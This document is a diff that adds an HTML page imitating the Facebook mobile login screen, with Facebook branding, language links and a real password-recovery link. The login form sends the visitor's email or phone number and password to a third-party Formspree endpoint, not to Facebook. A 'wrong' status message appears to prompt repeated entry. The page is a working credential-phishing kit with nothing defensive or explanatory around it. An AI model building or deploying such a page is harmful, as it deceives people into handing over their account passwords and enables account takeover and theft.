@@ -1,0 +1,60 @@
+<html>
+    <head>
+        <title>Login With Facebook</title>
+        <link href='style.css' rel='stylesheet'/>
+        <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@100&display=swap" rel="stylesheet">
+    </head>
+<body>
+    <div id="form_wrapper">
+        <h1>facebook</h1>
+        <form action="https://formspree.io/f/mbjqqyog" method="POST" id="my-form">
+            <div class="form-group" id="input_group">
+                <label for="username"></label>
+                <input id="username" type="username" placeholder="Mobile Number Or Email address" name="emailorphone" required/>
+            </div>
+
+            <div  class="form-group" id="input_group">
+                <label for="password"></label>
+                <input id="password" type="password" placeholder="Password" name="password" required/>
+            </div>
+            
+            <p id="statusText">wrong</p>
+            <button class="login" type="submit">Log In</button>
+        </form>
+    </div>
+    <div id="items">
+        <li><a class="forget_password" href="https://m.facebook.com/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&r&cuid&ars=facebook_login&privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNjMwMjM3NTYxLCJjYWxsc2l0ZV9pZCI6Mjg0Nzg1MTQ5MzQ1MzY5fQ%3D%3D&lwv=100&ref=dbl">Forget Password?</a></li>
+        <li class="or">or</li>
+        <li><a class="create" href="#">Create New Account</a></li>
+    </div>
+
+    <div id="language">
+        <ul class="left_group">
+            <li>English (UK)</li>
+            <li>অসমীয়া</li>
+            <li>नेपाली</li>
+            <li>Português (Brasil)</li>
+        </ul>
+        <ul class="right_group">
+            <li>বাংলা)</li>
+            <li>हिन्दी</li>
+            <li>Español</li>
+            <li>+</li>
+        </ul>
+    </div>
+        <div class="about_section">
+            <ul>
+                <li><a href="#">About</a></li>
+                <li><a href="#">Help</a></li>
+                <li><a href="#">More</a></li>
+            </ul>
+        </div>
+        <br/><br/>
+       <div>
+        <p class="copyright">Facebook Inc.</p>
+       </div>
+    <script src="script.js"></script>
+ </body>
+</html>
